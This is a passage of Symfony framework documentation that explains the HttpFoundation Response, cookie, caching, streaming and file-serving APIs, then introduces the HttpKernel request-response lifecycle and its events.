* :class:`Symfony\\Component\\HttpFoundation\\RequestMatcher\\AttributesRequestMatcher`
* :class:`Symfony\\Component\\HttpFoundation\\RequestMatcher\\ExpressionRequestMatcher`
* :class:`Symfony\\Component\\HttpFoundation\\RequestMatcher\\HeaderRequestMatcher`
* :class:`Symfony\\Component\\HttpFoundation\\RequestMatcher\\HostRequestMatcher`
* :class:`Symfony\\Component\\HttpFoundation\\RequestMatcher\\IpsRequestMatcher`
* :class:`Symfony\\Component\\HttpFoundation\\RequestMatcher\\IsJsonRequestMatcher`
* :class:`Symfony\\Component\\HttpFoundation\\RequestMatcher\\MethodRequestMatcher`
* :class:`Symfony\\Component\\HttpFoundation\\RequestMatcher\\PathRequestMatcher`
* :class:`Symfony\\Component\\HttpFoundation\\RequestMatcher\\PortRequestMatcher`
* :class:`Symfony\\Component\\HttpFoundation\\RequestMatcher\\QueryParameterRequestMatcher`
* :class:`Symfony\\Component\\HttpFoundation\\RequestMatcher\\SchemeRequestMatcher`

You can use them individually or combine them using the
:class:`Symfony\\Component\\HttpFoundation\\ChainRequestMatcher` class::

    use Symfony\Component\HttpFoundation\ChainRequestMatcher;
    use Symfony\Component\HttpFoundation\RequestMatcher\HostRequestMatcher;
    use Symfony\Component\HttpFoundation\RequestMatcher\PathRequestMatcher;
    use Symfony\Component\HttpFoundation\RequestMatcher\SchemeRequestMatcher;

    // use only one criteria to match the request
    $schemeMatcher = new SchemeRequestMatcher('https');
    if ($schemeMatcher->matches($request)) {
        // ...
    }

    // use a set of criteria to match the request
    $matcher = new ChainRequestMatcher([
        new HostRequestMatcher('example.com'),
        new PathRequestMatcher('/admin'),
    ]);

    if ($matcher->matches($request)) {
        // ...
    }

.. versionadded:: 7.1

    The ``HeaderRequestMatcher`` and ``QueryParameterRequestMatcher`` were
    introduced in Symfony 7.1.

Accessing other Data
~~~~~~~~~~~~~~~~~~~~

The ``Request`` class has many other methods that you can use to access the
request information. Have a look at
:class:`the Request API <Symfony\\Component\\HttpFoundation\\Request>`
for more information about them.

Overriding the Request
~~~~~~~~~~~~~~~~~~~~~~

The ``Request`` class should not be overridden as it is a data object that
represents an HTTP message. But when moving from a legacy system, adding
methods or changing some default behavior might help. In that case, register a
PHP callable that is able to create an instance of your ``Request`` class::

    use App\Http\SpecialRequest;
    use Symfony\Component\HttpFoundation\Request;

    Request::setFactory(function (
        array $query = [],
        array $request = [],
        array $attributes = [],
        array $cookies = [],
        array $files = [],
        array $server = [],
        $content = null
    ) {
        return new SpecialRequest(
            $query,
            $request,
            $attributes,
            $cookies,
            $files,
            $server,
            $content
        );
    });

    $request = Request::createFromGlobals();

.. _component-http-foundation-response:

Response
--------

A :class:`Symfony\\Component\\HttpFoundation\\Response` object holds all the
information that needs to be sent back to the client from a given request. The
constructor takes up to three arguments: the response content, the status
code, and an array of HTTP headers::

    use Symfony\Component\HttpFoundation\Response;

    $response = new Response(
        'Content',
        Response::HTTP_OK,
        ['content-type' => 'text/html']
    );

This information can also be manipulated after the Response object creation::

    $response->setContent('Hello World');

    // the headers public attribute is a ResponseHeaderBag
    $response->headers->set('Content-Type', 'text/plain');

    $response->setStatusCode(Response::HTTP_NOT_FOUND);

When setting the ``Content-Type`` of the Response, you can set the charset,
but it is better to set it via the
:method:`Symfony\\Component\\HttpFoundation\\Response::setCharset` method::

    $response->setCharset('ISO-8859-1');

Note that by default, Symfony assumes that your Responses are encoded in
UTF-8.

Sending the Response
~~~~~~~~~~~~~~~~~~~~

Before sending the Response, you can optionally call the
:method:`Symfony\\Component\\HttpFoundation\\Response::prepare` method to fix any
incompatibility with the HTTP specification (e.g. a wrong ``Content-Type`` header)::

    $response->prepare($request);

Sending the response to the client is done by calling the method
:method:`Symfony\\Component\\HttpFoundation\\Response::send`::

    $response->send();

The ``send()`` method takes an optional ``flush`` argument. If set to
``false``, functions like ``fastcgi_finish_request()`` or
``litespeed_finish_request()`` are not called. This is useful when debugging
your application to see which exceptions are thrown in listeners of the
:class:`Symfony\\Component\\HttpKernel\\Event\\TerminateEvent`. You can learn
more about it in
:ref:`the dedicated section about Kernel events <http-kernel-creating-listener>`.

Setting Cookies
~~~~~~~~~~~~~~~

The response cookies can be manipulated through the ``headers`` public
attribute::

    use Symfony\Component\HttpFoundation\Cookie;

    $response->headers->setCookie(Cookie::create('foo', 'bar'));

The
:method:`Symfony\\Component\\HttpFoundation\\ResponseHeaderBag::setCookie`
method takes an instance of
:class:`Symfony\\Component\\HttpFoundation\\Cookie` as an argument.

You can clear a cookie via the
:method:`Symfony\\Component\\HttpFoundation\\ResponseHeaderBag::clearCookie` method.

In addition to the ``Cookie::create()`` method, you can create a ``Cookie``
object from a raw header value using :method:`Symfony\\Component\\HttpFoundation\\Cookie::fromString`
method. You can also use the ``with*()`` methods to change some Cookie property (or
to build the entire Cookie using a fluent interface). Each ``with*()`` method returns
a new object with the modified property::

    $cookie = Cookie::create('foo')
        ->withValue('bar')
        ->withExpires(strtotime('Fri, 20-May-2011 15:25:52 GMT'))
        ->withDomain('.example.com')
        ->withSecure(true);

It is possible to define partitioned cookies, also known as `CHIPS`_, by using the
:method:`Symfony\\Component\\HttpFoundation\\Cookie::withPartitioned` method::

    $cookie = Cookie::create('foo')
        ->withValue('bar')
        ->withPartitioned();

    // you can also set the partitioned argument to true when using the `create()` factory method
    $cookie = Cookie::create('name', 'value', partitioned: true);

Managing the HTTP Cache
~~~~~~~~~~~~~~~~~~~~~~~

The :class:`Symfony\\Component\\HttpFoundation\\Response` class has a rich set
of methods to manipulate the HTTP headers related to the cache:

* :method:`Symfony\\Component\\HttpFoundation\\Response::setPublic`
* :method:`Symfony\\Component\\HttpFoundation\\Response::setPrivate`
* :method:`Symfony\\Component\\HttpFoundation\\Response::expire`
* :method:`Symfony\\Component\\HttpFoundation\\Response::setExpires`
* :method:`Symfony\\Component\\HttpFoundation\\Response::setMaxAge`
* :method:`Symfony\\Component\\HttpFoundation\\Response::setSharedMaxAge`
* :method:`Symfony\\Component\\HttpFoundation\\Response::setStaleIfError`
* :method:`Symfony\\Component\\HttpFoundation\\Response::setStaleWhileRevalidate`
* :method:`Symfony\\Component\\HttpFoundation\\Response::setTtl`
* :method:`Symfony\\Component\\HttpFoundation\\Response::setClientTtl`
* :method:`Symfony\\Component\\HttpFoundation\\Response::setLastModified`
* :method:`Symfony\\Component\\HttpFoundation\\Response::setEtag`
* :method:`Symfony\\Component\\HttpFoundation\\Response::setVary`

.. note::

    The methods :method:`Symfony\\Component\\HttpFoundation\\Response::setExpires`,
    :method:`Symfony\\Component\\HttpFoundation\\Response::setLastModified` and
    :method:`Symfony\\Component\\HttpFoundation\\Response::setDate` accept any
    object that implements ``\DateTimeInterface``, including immutable date objects.

The :method:`Symfony\\Component\\HttpFoundation\\Response::setCache` method
can be used to set the most commonly used cache information in one method
call::

    $response->setCache([
        'must_revalidate'  => false,
        'no_cache'         => false,
        'no_store'         => false,
        'no_transform'     => false,
        'public'           => true,
        'private'          => false,
        'proxy_revalidate' => false,
        'max_age'          => 600,
        's_maxage'         => 600,
        'stale_if_error'   => 86400,
        'stale_while_revalidate' => 60,
        'immutable'        => true,
        'last_modified'    => new \DateTime(),
        'etag'             => 'abcdef',
    ]);

To check if the Response validators (``ETag``, ``Last-Modified``) match a
conditional value specified in the client Request, use the
:method:`Symfony\\Component\\HttpFoundation\\Response::isNotModified`
method::

    if ($response->isNotModified($request)) {
        $response->send();
    }

If the Response is not modified, it sets the status code to 304 and removes the
actual response content.

.. _redirect-response:

Redirecting the User
~~~~~~~~~~~~~~~~~~~~

To redirect the client to another URL, you can use the
:class:`Symfony\\Component\\HttpFoundation\\RedirectResponse` class::

    use Symfony\Component\HttpFoundation\RedirectResponse;

    $response = new RedirectResponse('http://example.com/');

.. _streaming-response:

Streaming a Response
~~~~~~~~~~~~~~~~~~~~

The :class:`Symfony\\Component\\HttpFoundation\\StreamedResponse` class allows
you to stream the Response back to the client. The response content is
represented by a PHP callable instead of a string::

    use Symfony\Component\HttpFoundation\StreamedResponse;

    $response = new StreamedResponse();
    $response->setCallback(function (): void {
        var_dump('Hello World');
        flush();
        sleep(2);
        var_dump('Hello World');
        flush();
    });
    $response->send();

.. note::

    The ``flush()`` function does not flush buffering. If ``ob_start()`` has
    been called before or the ``output_buffering`` ``php.ini`` option is enabled,
    you must call ``ob_flush()`` before ``flush()``.

    Additionally, PHP isn't the only layer that can buffer output. Your web
    server might also buffer based on its configuration. Some servers, such as
    nginx, let you disable buffering at the config level or by adding a special HTTP
    header in the response::

        // disables FastCGI buffering in nginx only for this response
        $response->headers->set('X-Accel-Buffering', 'no');

Streaming a JSON Response
~~~~~~~~~~~~~~~~~~~~~~~~~

The :class:`Symfony\\Component\\HttpFoundation\\StreamedJsonResponse` allows to
stream large JSON responses using PHP generators to keep the used resources low.

The class constructor expects an array which represents the JSON structure and
includes the list of contents to stream. In addition to PHP generators, which are
recommended to minimize memory usage, it also supports any kind of PHP Traversable
containing JSON serializable data::

    use Symfony\Component\HttpFoundation\StreamedJsonResponse;

    // any method or function returning a PHP Generator
    function loadArticles(): \Generator {
        yield ['title' => 'Article 1'];
        yield ['title' => 'Article 2'];
        yield ['title' => 'Article 3'];
    };

    $response = new StreamedJsonResponse(
        // JSON structure with generators in which will be streamed as a list
        [
            '_embedded' => [
                'articles' => loadArticles(),
            ],
        ],
    );

When loading data via Doctrine, you can use the ``toIterable()`` method to
fetch results row by row and minimize resources consumption.
See the `Doctrine Batch processing`_ documentation for more::

    public function __invoke(): Response
    {
        return new StreamedJsonResponse(
            [
                '_embedded' => [
                    'articles' => $this->loadArticles(),
                ],
            ],
        );
    }

    public function loadArticles(): \Generator
    {
        // get the $entityManager somehow (e.g. via constructor injection)
        $entityManager = ...

        $queryBuilder = $entityManager->createQueryBuilder();
        $queryBuilder->from(Article::class, 'article');
        $queryBuilder->select('article.id')
            ->addSelect('article.title')
            ->addSelect('article.description');

        return $queryBuilder->getQuery()->toIterable();
    }

If you return a lot of data, consider calling the :phpfunction:`flush` function
after some specific item count to send the contents to the browser::

    public function loadArticles(): \Generator
    {
        // ...

        $count = 0;
        foreach ($queryBuilder->getQuery()->toIterable() as $article) {
            yield $article;

            if (0 === ++$count % 100) {
                flush();
            }
        }
    }

Alternatively, you can also pass any iterable to ``StreamedJsonResponse``,
including generators::

    public function loadArticles(): \Generator
    {
        yield ['title' => 'Article 1'];
        yield ['title' => 'Article 2'];
        yield ['title' => 'Article 3'];
    }

    public function __invoke(): Response
    {
        // ...

        return new StreamedJsonResponse(loadArticles());
    }

.. _component-http-foundation-serving-files:

Serving Files
~~~~~~~~~~~~~

When sending a file, you must add a ``Content-Disposition`` header to your
response. While creating this header for basic file downloads is straightforward,
using non-ASCII filenames is more involved. The
:method:`Symfony\\Component\\HttpFoundation\\HeaderUtils::makeDisposition`
abstracts the hard work behind a simple API::

    use Symfony\Component\HttpFoundation\HeaderUtils;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\HttpFoundation\ResponseHeaderBag;

    $fileContent = ...; // the generated file content
    $response = new Response($fileContent);

    $disposition = HeaderUtils::makeDisposition(
        HeaderUtils::DISPOSITION_ATTACHMENT,
        'foo.pdf'
    );

    $response->headers->set('Content-Disposition', $disposition);

Alternatively, if you are serving a static file, you can use a
:class:`Symfony\\Component\\HttpFoundation\\BinaryFileResponse`::

    use Symfony\Component\HttpFoundation\BinaryFileResponse;

    $file = 'path/to/file.txt';
    $response = new BinaryFileResponse($file);

The ``BinaryFileResponse`` will automatically handle ``Range`` and
``If-Range`` headers from the request. It also supports ``X-Sendfile``
(see for `nginx`_ and `Apache`_). To make use of it, you need to determine
whether or not the ``X-Sendfile-Type`` header should be trusted and call
:method:`Symfony\\Component\\HttpFoundation\\BinaryFileResponse::trustXSendfileTypeHeader`
if it should::

    BinaryFileResponse::trustXSendfileTypeHeader();

.. note::

    The ``BinaryFileResponse`` will only handle ``X-Sendfile`` if the particular header is present.
    For Apache, this is not the default case.

    To add the header use the ``mod_headers`` Apache module and add the following to the Apache configuration:

    .. code-block:: apache

        <IfModule mod_xsendfile.c>
          # This is already present somewhere...
          XSendFile on
          XSendFilePath ...some path...

          # This needs to be added:
          <IfModule mod_headers.c>
            RequestHeader set X-Sendfile-Type X-Sendfile
          </IfModule>
        </IfModule>

With the ``BinaryFileResponse``, you can still set the ``Content-Type`` of the sent file,
or change its ``Content-Disposition``::

    // ...
    $response->headers->set('Content-Type', 'text/plain');
    $response->setContentDisposition(
        ResponseHeaderBag::DISPOSITION_ATTACHMENT,
        'filename.txt'
    );

It is possible to delete the file after the response is sent with the
:method:`Symfony\\Component\\HttpFoundation\\BinaryFileResponse::deleteFileAfterSend` method.
Please note that this will not work when the ``X-Sendfile`` header is set.

Alternatively, ``BinaryFileResponse`` supports instances of ``\SplTempFileObject``.
This is useful when you want to serve a file that has been created in memory
and that will be automatically deleted after the response is sent::

    use Symfony\Component\HttpFoundation\BinaryFileResponse;

    $file = new \SplTempFileObject();
    $file->fwrite('Hello World');
    $file->rewind();

    $response = new BinaryFileResponse($file);

.. versionadded:: 7.1

    The support for ``\SplTempFileObject`` in ``BinaryFileResponse``
    was introduced in Symfony 7.1.

If the size of the served file is unknown (e.g. because it's being generated on the fly,
or because a PHP stream filter is registered on it, etc.), you can pass a ``Stream``
instance to ``BinaryFileResponse``. This will disable ``Range`` and ``Content-Length``
handling, switching to chunked encoding instead::

    use Symfony\Component\HttpFoundation\BinaryFileResponse;
    use Symfony\Component\HttpFoundation\File\Stream;

    $stream = new Stream('path/to/stream');
    $response = new BinaryFileResponse($stream);

.. note::

    If you *just* created the file during this same request, the file *may* be sent
    without any content. This may be due to cached file stats that return zero for
    the size of the file. To fix this issue, call ``clearstatcache(true, $file)``
    with the path to the binary file.

.. _component-http-foundation-json-response:

Creating a JSON Response
~~~~~~~~~~~~~~~~~~~~~~~~

Any type of response can be created via the
:class:`Symfony\\Component\\HttpFoundation\\Response` class by setting the
right content and headers. A JSON response might look like this::

    use Symfony\Component\HttpFoundation\Response;

    $response = new Response();
    $response->setContent(json_encode([
        'data' => 123,
    ]));
    $response->headers->set('Content-Type', 'application/json');

There is also a helpful :class:`Symfony\\Component\\HttpFoundation\\JsonResponse`
class, which can make this even easier::

    use Symfony\Component\HttpFoundation\JsonResponse;

    // if you know the data to send when creating the response
    $response = new JsonResponse(['data' => 123]);

    // if you don't know the data to send or if you want to customize the encoding options
    $response = new JsonResponse();
    // ...
    // configure any custom encoding options (if needed, it must be called before "setData()")
    //$response->setEncodingOptions(JsonResponse::DEFAULT_ENCODING_OPTIONS | \JSON_PRESERVE_ZERO_FRACTION);
    $response->setData(['data' => 123]);

    // if the data to send is already encoded in JSON
    $response = JsonResponse::fromJsonString('{ "data": 123 }');

The ``JsonResponse`` class sets the ``Content-Type`` header to
``application/json`` and encodes your data to JSON when needed.

.. danger::

    To avoid XSSI `JSON Hijacking`_, you should pass an associative array
    as the outermost array to ``JsonResponse`` and not an indexed array so
    that the final result is an object (e.g. ``{"object": "not inside an array"}``)
    instead of an array (e.g. ``[{"object": "inside an array"}]``). Read
    the `OWASP guidelines`_ for more information.

    Only methods that respond to GET requests are vulnerable to XSSI 'JSON Hijacking'.
    Methods responding to POST requests only remain unaffected.

JSONP Callback
~~~~~~~~~~~~~~

If you're using JSONP, you can set the callback function that the data should
be passed to::

    $response->setCallback('handleResponse');

In this case, the ``Content-Type`` header will be ``text/javascript`` and
the response content will look like this:

.. code-block:: javascript

    handleResponse({'data': 123});

Session
-------

The session information is in its own document: :doc:`/session`.

Safe Content Preference
-----------------------

Some web sites have a "safe" mode to assist those who don't want to be exposed
to content to which they might object. The  `RFC 8674`_ specification defines a
way for user agents to ask for safe content to a server.

The specification does not define what content might be considered objectionable,
so the concept of "safe" is not precisely defined. Rather, the term is interpreted
by the server and within the scope of each web site that chooses to act upon this information.

Symfony offers two methods to interact with this preference:

* :method:`Symfony\\Component\\HttpFoundation\\Request::preferSafeContent`;
* :method:`Symfony\\Component\\HttpFoundation\\Response::setContentSafe`;

The following example shows how to detect if the user agent prefers "safe" content::

    if ($request->preferSafeContent()) {
        $response = new Response($alternativeContent);
        // this informs the user we respected their preferences
        $response->setContentSafe();

        return $response;

Generating Relative and Absolute URLs
-------------------------------------

Generating absolute and relative URLs for a given path is a common need
in some applications. In Twig templates you can use the
:ref:`absolute_url() <reference-twig-function-absolute-url>` and
:ref:`relative_path() <reference-twig-function-relative-path>` functions to do that.

The :class:`Symfony\\Component\\HttpFoundation\\UrlHelper` class provides the
same functionality for PHP code via the ``getAbsoluteUrl()`` and ``getRelativePath()``
methods. You can inject this as a service anywhere in your application::

    // src/Normalizer/UserApiNormalizer.php
    namespace App\Normalizer;

    use Symfony\Component\HttpFoundation\UrlHelper;

    class UserApiNormalizer
    {
        public function __construct(
            private UrlHelper $urlHelper,
        ) {
        }

        public function normalize($user): array
        {
            return [
                'avatar' => $this->urlHelper->getAbsoluteUrl($user->avatar()->path()),
            ];
        }
    }

Learn More
----------

.. toctree::
    :maxdepth: 1
    :glob:

    /controller
    /controller/*
    /session
    /http_cache/*

.. _nginx: https://www.nginx.com/resources/wiki/start/topics/examples/xsendfile/
.. _Apache: https://tn123.org/mod_xsendfile/
.. _`JSON Hijacking`: https://haacked.com/archive/2009/06/25/json-hijacking.aspx/
.. _OWASP guidelines: https://cheatsheetseries.owasp.org/cheatsheets/AJAX_Security_Cheat_Sheet.html#always-return-json-with-an-object-on-the-outside
.. _RFC 8674: https://tools.ietf.org/html/rfc8674
.. _Doctrine Batch processing: https://www.doctrine-project.org/projects/doctrine-orm/en/2.14/reference/batch-processing.html#iterating-results
.. _`CHIPS`: https://developer.mozilla.org/en-US/docs/Web/Privacy/Partitioned_cookies
The HttpKernel Component
========================

    The HttpKernel component provides a structured process for converting
    a ``Request`` into a ``Response`` by making use of the EventDispatcher
    component. It's flexible enough to create a full-stack framework (Symfony),
    a micro-framework (Silex) or an advanced CMS (Drupal).

Installation
------------

.. code-block:: terminal

    $ composer require symfony/http-kernel

.. include:: /components/require_autoload.rst.inc

.. _the-workflow-of-a-request:

The Request-Response Lifecycle
------------------------------

.. seealso::

    This article explains how to use the HttpKernel features as an independent
    component in any PHP application. In Symfony applications everything is
    already configured and ready to use. Read the :doc:`/controller` and
    :doc:`/event_dispatcher` articles to learn about how to use it to create
    controllers and define events in Symfony applications.

Every HTTP web interaction begins with a request and ends with a response.
Your job as a developer is to create PHP code that reads the request information
(e.g. the URL) and creates and returns a response (e.g. an HTML page or JSON string).
This is a simplified overview of the request-response lifecycle in Symfony applications:

#. The **user** asks for a **resource** in a **browser**;
#. The **browser** sends a **request** to the **server**;
#. **Symfony** gives the **application** a **Request** object;
#. The **application** generates a **Response** object using the data of the **Request** object;
#. The **server** sends back the **response** to the **browser**;
#. The **browser** displays the **resource** to the **user**.

Typically, some sort of framework or system is built to handle all the repetitive
tasks (e.g. routing, security, etc) so that a developer can build each *page* of
the application. Exactly *how* these systems are built varies greatly. The HttpKernel
component provides an interface that formalizes the process of starting with a
request and creating the appropriate response. The component is meant to be the
heart of any application or framework, no matter how varied the architecture of
that system::

    namespace Symfony\Component\HttpKernel;

    use Symfony\Component\HttpFoundation\Request;

    interface HttpKernelInterface
    {
        // ...

        /**
         * @return Response A Response instance
         */
        public function handle(
            Request $request,
            int $type = self::MAIN_REQUEST,
            bool $catch = true
        ): Response;
    }

Internally, :method:`HttpKernel::handle() <Symfony\\Component\\HttpKernel\\HttpKernel::handle>` -
the concrete implementation of :method:`HttpKernelInterface::handle() <Symfony\\Component\\HttpKernel\\HttpKernelInterface::handle>` -
defines a lifecycle that starts with a :class:`Symfony\\Component\\HttpFoundation\\Request`
and ends with a :class:`Symfony\\Component\\HttpFoundation\\Response`.

.. raw:: html

    <object data="../_images/components/http_kernel/http-workflow.svg" type="image/svg+xml"
        alt="A flow diagram showing all HTTP Kernel events in the Request-Response lifecycle. Each event is numbered 1 to 8 and described in detail in the following subsections."
    ></object>

The exact details of this lifecycle are the key to understanding how the kernel
(and the Symfony Framework or any other library that uses the kernel) works.

HttpKernel: Driven by Events
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The ``HttpKernel::handle()`` method works internally by dispatching events.
This makes the method both flexible, but also a bit abstract, since all the
"work" of a framework/application built with HttpKernel is actually done
in event listeners.

To help explain this process, this document looks at each step of the process
and talks about how one specific implementation of the HttpKernel - the Symfony
Framework - works.

Initially, using the :class:`Symfony\\Component\\HttpKernel\\HttpKernel` does
not take many steps. You create an
:doc:`event dispatcher </components/event_dispatcher>` and a
:ref:`controller and argument resolver <component-http-kernel-resolve-controller>`
(explained below). To complete your working kernel, you'll add more event
listeners to the events discussed below::

    use Symfony\Component\EventDispatcher\EventDispatcher;
    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\RequestStack;
    use Symfony\Component\HttpKernel\Controller\ArgumentResolver;
    use Symfony\Component\HttpKernel\Controller\ControllerResolver;
    use Symfony\Component\HttpKernel\HttpKernel;

    // create the Request object
    $request = Request::createFromGlobals();

    $dispatcher = new EventDispatcher();
    // ... add some event listeners

    // create your controller and argument resolvers
    $controllerResolver = new ControllerResolver();
    $argumentResolver = new ArgumentResolver();

    // instantiate the kernel
    $kernel = new HttpKernel($dispatcher, $controllerResolver, new RequestStack(), $argumentResolver);

    // actually execute the kernel, which turns the request into a response
    // by dispatching events, calling a controller, and returning the response
    $response = $kernel->handle($request);

    // send the headers and echo the content
    $response->send();

    // trigger the kernel.terminate event
    $kernel->terminate($request, $response);

See ":ref:`A full working example <http-kernel-working-example>`" for a more concrete implementation.

For general information on adding listeners to the events below, see
:ref:`Creating an Event Listener <http-kernel-creating-listener>`.

.. seealso::

    There is a wonderful tutorial series on using the HttpKernel component and
    other Symfony components to create your own framework. See
    :doc:`/create_framework/introduction`.

.. _component-http-kernel-kernel-request:

1) The ``kernel.request`` Event
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**Typical Purposes**: To add more information to the ``Request``, initialize
parts of the system, or return a ``Response`` if possible (e.g. a security
layer that denies access).

:ref:`Kernel Events Information Table <component-http-kernel-event-table>`

The first event that is dispatched inside :method:`HttpKernel::handle <Symfony\\Component\\HttpKernel\\HttpKernel::handle>`
is ``kernel.request``, which may have a variety of different listeners.

Listeners of this event can be quite varied. Some listeners - such as a security
listener - might have enough information to create a ``Response`` object immediately.
For example, if a security listener determined that a user doesn't have access,
that listener may return a :class:`Symfony\\Component\\HttpFoundation\\RedirectResponse`
to the login page or a 403 Access Denied response.

If a ``Response`` is returned at this stage, the process skips directly to
the :ref:`kernel.response <component-http-kernel-kernel-response>` event.

Other listeners initialize things or add more information to the request.
For example, a listener might determine and set the locale on the ``Request``
object.

Another common listener is routing. A router listener may process the ``Request``
and determine the controller that should be rendered (see the next section).
In fact, the ``Request`` object has an ":ref:`attributes <component-foundation-attributes>`"
bag which is a perfect spot to store this extra, application-specific data
about the request. This means that if your router listener somehow determines
the controller, it can store it on the ``Request`` attributes (which can be used
by your controller resolver).

Overall, the purpose of the ``kernel.request`` event is either to create and
return a ``Response`` directly, or to add information to the ``Request``
(e.g. setting the locale or setting some other information on the ``Request``
attributes).

.. note::

    When setting a response for the ``kernel.request`` event, the propagation
    is stopped. This means listeners with lower priority won't be executed.

.. sidebar:: ``kernel.request`` in the Symfony Framework

    The most important listener to ``kernel.request`` in the Symfony Framework
    is the :class:`Symfony\\Component\\HttpKernel\\EventListener\\RouterListener`.
    This class executes the routing layer, which returns an *array* of information
    about the matched request, including the ``_controller`` and any placeholders
    that are in the route's pattern (e.g. ``{slug}``). See the
    :doc:`Routing documentation </routing>`.

    This array of information is stored in the :class:`Symfony\\Component\\HttpFoundation\\Request`
    object's ``attributes`` array. Adding the routing information here doesn't
    do anything yet, but is used next when resolving the controller.

.. _component-http-kernel-resolve-controller:

2) Resolve the Controller
~~~~~~~~~~~~~~~~~~~~~~~~~

Assuming that no ``kernel.request`` listener was able to create a ``Response``,
the next step in HttpKernel is to determine and prepare (i.e. resolve) the
controller. The controller is the part of the end-application's code that
is responsible for creating and returning the ``Response`` for a specific page.
The only requirement is that it is a PHP callable - i.e. a function, method
on an object or a ``Closure``.

But *how* you determine the exact controller for a request is entirely up
to your application. This is the job of the "controller resolver" - a class
that implements :class:`Symfony\\Component\\HttpKernel\\Controller\\ControllerResolverInterface`
and is one of the constructor arguments to ``HttpKernel``.

Your job is to create a class that implements the interface and fill in its
method: ``getController()``. In fact, one default implementation already
exists, which you can use directly or learn from:
:class:`Symfony\\Component\\HttpKernel\\Controller\\ControllerResolver`.
This implementation is explained more in the sidebar below::

    namespace Symfony\Component\HttpKernel\Controller;

    use Symfony\Component\HttpFoundation\Request;

    interface ControllerResolverInterface
    {
        public function getController(Request $request): callable|false;
    }

Internally, the ``HttpKernel::handle()`` method first calls
:method:`Symfony\\Component\\HttpKernel\\Controller\\ControllerResolverInterface::getController`
on the controller resolver. This method is passed the ``Request`` and is responsible
for somehow determining and returning a PHP callable (the controller) based
on the request's information.

.. sidebar:: Resolving the Controller in the Symfony Framework

    The Symfony Framework uses the built-in
    :class:`Symfony\\Component\\HttpKernel\\Controller\\ControllerResolver`
    class (actually, it uses a subclass with some extra functionality
    mentioned below). This class leverages the information that was placed
    on the ``Request`` object's ``attributes`` property during the ``RouterListener``.

    **getController**

    The ``ControllerResolver`` looks for a ``_controller``
    key on the ``Request`` object's attributes property (recall that this
    information is typically placed on the ``Request`` via the ``RouterListener``).
    This string is then transformed into a PHP callable by doing the following:

    a) If the ``_controller`` key doesn't follow the recommended PHP namespace
       format (e.g. ``App\Controller\DefaultController::index``) its format is
       transformed into it. For example, the legacy ``FooBundle:Default:index``
       format would be changed to ``Acme\FooBundle\Controller\DefaultController::indexAction``.
       This transformation is specific to the :class:`Symfony\\Bundle\\FrameworkBundle\\Controller\\ControllerResolver`
       sub-class used by the Symfony Framework.

    b) A new instance of your controller class is instantiated with no
       constructor arguments.

.. _component-http-kernel-kernel-controller:

3) The ``kernel.controller`` Event
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**Typical Purposes**: Initialize things or change the controller just before
the controller is executed.

:ref:`Kernel Events Information Table <component-http-kernel-event-table>`

After the controller callable has been determined, ``HttpKernel::handle()``
dispatches the ``kernel.controller`` event. Listeners to this event might initialize
some part of the system that needs to be initialized after certain things
have been determined (e.g. the controller, routing information) but before
the controller is executed.

Another typical use-case for this event is to retrieve the attributes from
the controller using the :method:`Symfony\\Component\\HttpKernel\\Event\\ControllerEvent::getAttributes`
method. See the Symfony section below for some examples.

Listeners to this event can also change the controller callable completely
by calling :method:`ControllerEvent::setController <Symfony\\Component\\HttpKernel\\Event\\ControllerEvent::setController>`
on the event object that's passed to listeners on this event.

.. sidebar:: ``kernel.controller`` in the Symfony Framework

    An interesting listener to ``kernel.controller`` in the Symfony
    Framework is :class:`Symfony\\Component\\HttpKernel\\EventListener\\CacheAttributeListener`.
    This class fetches ``#[Cache]`` attribute configuration from the
    controller and uses it to configure :doc:`HTTP caching </http_cache>`
    on the response.

    There are a few other minor listeners to the ``kernel.controller`` event in
    the Symfony Framework that deal with collecting profiler data when the
    profiler is enabled.

4) Getting the Controller Arguments
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Next, ``HttpKernel::handle()`` calls
:method:`ArgumentResolverInterface::getArguments() <Symfony\\Component\\HttpKernel\\Controller\\ArgumentResolverInterface::getArguments>`.
Remember that the controller returned in ``getController()`` is a callable.
The purpose of ``getArguments()`` is to return the array of arguments that
should be passed to that controller. Exactly how this is done is completely
up to your design, though the built-in :class:`Symfony\\Component\\HttpKernel\\Controller\\ArgumentResolver`
is a good example.

At this point the kernel has a PHP callable (the controller) and an array
of arguments that should be passed when executing that callable.

.. sidebar:: Getting the Controller Arguments in the Symfony Framework

    Now that you know exactly what the controller callable (usually a method
    inside a controller object) is, the ``ArgumentResolver`` uses `reflection`_
    on the callable to return an array of the *names* of each of the arguments.
    It then iterates over each of these arguments and uses the following tricks
    to determine which value should be passed for each argument:

    a) If the ``Request`` attributes bag contains a key that matches the name
       of the argument, that value is used. For example, if the first argument
       to a controller is ``$slug`` and there is a ``slug`` key in the ``Request``
       ``attributes`` bag, that value is used (and typically this value came
       from the ``RouterListener``).

    b) If the argument in the controller is type-hinted with Symfony's
       :class:`Symfony\\Component\\HttpFoundation\\Request` object, the
       ``Request`` is passed in as the value.

    c) If the function or method argument is `variadic`_ and the ``Request``
       ``attributes`` bag contains an array for that argument, they will all be
       available through the `variadic`_ argument.

    This functionality is provided by resolvers implementing the
    :class:`Symfony\\Component\\HttpKernel\\Controller\\ValueResolverInterface`.
    There are four implementations which provide the default behavior of
    Symfony but customization is the key here. By implementing the
    ``ValueResolverInterface`` yourself and passing this to the
    ``ArgumentResolver``, you can extend this functionality.

.. _component-http-kernel-calling-controller:

5) Calling the Controller
~~~~~~~~~~~~~~~~~~~~~~~~~

The next step of ``HttpKernel::handle()`` is executing the controller.

The job of the controller is to build the response for the given resource.
This could be an HTML page, a JSON string or anything else. Unlike every
other part of the process so far, this step is implemented by the "end-developer",
for each page that is built.

Usually, the controller will return a ``Response`` object. If this is true,
then the work of the kernel is just about done! In this case, the next step
is the :ref:`kernel.response <component-http-kernel-kernel-response>` event.

But if the controller returns anything besides a ``Response``, then the kernel
has a little bit more work to do - :ref:`kernel.view <component-http-kernel-kernel-view>`
(since the end goal is *always* to generate a ``Response`` object).

.. note::

    A controller must return *something*. If a controller returns ``null``,
    an exception will be thrown immediately.

.. _component-http-kernel-kernel-view:

6) The ``kernel.view`` Event
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**Typical Purposes**: Transform a non-``Response`` return value from a controller
